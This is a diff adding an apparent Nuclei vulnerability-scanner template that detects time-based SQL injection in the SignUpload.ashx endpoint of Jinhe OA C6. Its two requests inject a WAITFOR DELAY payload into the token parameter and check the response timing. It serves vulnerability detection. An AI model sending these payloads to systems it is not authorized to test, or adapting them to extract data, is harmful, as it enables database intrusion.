@@ -1,0 +1,30 @@
+id: jinheOA-C6-SignUpload_ashx-sql
+
+info:
+  name: 金和OA C6 SignUpload.ashx SQL注入
+  author: HuanXiong
+  severity: high
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%204%27+--%20and%201=1_123_123&filename=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+      - |
+        GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%208%27+--%20and%201=1_123_123&filename=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+
